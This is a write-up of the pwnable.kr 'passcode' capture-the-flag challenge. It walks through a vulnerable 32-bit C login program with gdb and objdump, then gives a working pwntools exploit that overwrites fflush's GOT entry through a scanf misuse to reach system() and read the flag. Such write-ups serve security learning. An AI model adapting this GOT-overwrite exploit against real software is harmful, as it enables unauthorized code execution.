---
title: "Writeup: passcode"
date: 2020-12-06T20:04:19+08:00
draft: false
---

This is a challenge from [pwnable.kr](http://pwnable.kr/play.php), it is a 32-bit ELF file without stripped.

```
passcode@pwnable:~$ file passcode
passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped
```

The source code could be displayed as follows. 

```c
passcode@pwnable:~$ cat passcode.c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

As you can see, our goal is to execute system("/bin/cat flag"). Let's check the protection mechanism of the executable first. 

```
passcode@pwnable:~$ checksec passcode
[*] '/home/passcode/passcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Here are some ideas, since we can not exploit passcode1/passcode2 and buffer overflow directly, we're going to modify the GOT in order to force the program to execute our target. 

```
1. modify the values of passcode1 and passcode2 -> not writable -> x 
2. exploit buffer overflow -> canary is found -> x 
3. hijack the GOT -> partial RELRO -> v 
```

Note that scanf function in the source code lacks the address of operator (&), so our input would be treated as the address. We need to find out the location of "name", let's check it with gdb tool. As you can see, "name" is at [ebp - 0x70], where ebp is 0xff87eea8 at this point. 

```
(gdb) disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   %ebp
   0x0804860a <+1>:     mov    %esp,%ebp
   0x0804860c <+3>:     sub    $0x88,%esp
   0x08048612 <+9>:     mov    %gs:0x14,%eax
   0x08048618 <+15>:    mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:    xor    %eax,%eax
   0x0804861d <+20>:    mov    $0x80487cb,%eax
   0x08048622 <+25>:    mov    %eax,(%esp)
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    $0x80487dd,%eax
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    $0x80487e3,%eax
   0x08048643 <+58>:    lea    -0x70(%ebp),%edx
   0x08048646 <+61>:    mov    %edx,0x4(%esp)
   0x0804864a <+65>:    mov    %eax,(%esp)
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
   0x08048652 <+73>:    mov    -0xc(%ebp),%eax
   0x08048655 <+76>:    xor    %gs:0x14,%eax
   0x0804865c <+83>:    je     0x8048663 <welcome+90>
   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:    leave  
   0x08048664 <+91>:    ret    
End of assembler dump.
(gdb) b *0x0804862f
Breakpoint 1 at 0x804862f
(gdb) r
Starting program: /home/passcode/passcode
Toddler's Secure Login System 1.0 beta.

Breakpoint 1, 0x0804862f in welcome ()
(gdb) x/i $pc
=> 0x804862f <welcome+38>:      lea    -0x70(%ebp),%edx
(gdb) info registers ebp
ebp            0xff87eea8       0xff87eea8
```

We also need the location of "passcode1". Similarly, check it with gdb tool again. You can input an arbitrary value as the string "name". 

```
(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   %ebp
   0x08048565 <+1>:     mov    %esp,%ebp
   0x08048567 <+3>:     sub    $0x28,%esp
   0x0804856a <+6>:     mov    $0x8048770,%eax
   0x0804856f <+11>:    mov    %eax,(%esp)
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    $0x8048783,%eax
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    0x804a02c,%eax
   0x08048590 <+44>:    mov    %eax,(%esp)
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    $0x8048786,%eax
   0x0804859d <+57>:    mov    %eax,(%esp)
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    $0x8048783,%eax
   0x080485aa <+70>:    mov    -0xc(%ebp),%edx
   0x080485ad <+73>:    mov    %edx,0x4(%esp)
   0x080485b1 <+77>:    mov    %eax,(%esp)
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    movl   $0x8048799,(%esp)
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave  
   0x080485f0 <+140>:   ret    
   0x080485f1 <+141>:   movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
   0x080485fd <+153>:   movl   $0x0,(%esp)
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
End of assembler dump.
(gdb) b *0x0804857c
Breakpoint 2 at 0x804857c
(gdb) c
Continuing.
enter you name : 123
Welcome 123!

Breakpoint 2, 0x0804857c in login ()
(gdb) x/i $pc
=> 0x804857c <login+24>:        mov    -0x10(%ebp),%edx
(gdb) info registers ebp
ebp            0xff87eea8       0xff87eea8
```

As you can see, "passcode1" is at [ebp - 0x10], where ebp is 0xff87eea8 at this point. Both of "name" and "passcode1" have the same ebp, so the offset between "name" and "passcode1" is 0x60, which is the number of bytes needed to cover later. Besides, the size of the string "name" is 100, so we can cover the last 4 bytes and redirect to other functions whose GOT will be modified later. In this way, we can force the victim function to execute our target. 

Hence, the next step is to modify the GOT. Check the dynamic relocation entries with objdump command. 

```
passcode@pwnable:~$ objdump -R ./passcode

./passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin@@GLIBC_2.0
0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   __gmon_start__
0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
```

According to the source code, after entering the password1, the program will execute fflush and printf function. So our victim function could be either fflush (0x0804a004) or printf (0x0804a000). Apart from that, since our goal is to run the executable flag, we can update the address as 0x080485d7 (print Login OK! -> system) or 0x080485e3 (ignore print Login OK!, execute system directly). You can use combinations of them. 

Here is one of the solutions. 

```python
from pwn import *
context(arch='i386')

sh = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)
proc = sh.process('./passcode')
payload = 'a' * 0x60 + p32(0x0804a004) + str(0x080485d7) 
proc.sendlineafter('enter you name : ', payload)
proc.interactive()
```

The flag is as follows. 

```
$ python exp.py
[+] Connecting to pwnable.kr on port 2222: Done
[*] passcode@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Starting remote process './passcode' on pwnable.kr: pid 447293
[*] Switching to interactive mode
Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x04\x04!
enter passcode1 : Login OK!
Sorry mom.. I got confused about scanf usage :(
Now I can safely trust you that you have credential :)
[*] Got EOF while reading in interactive
```















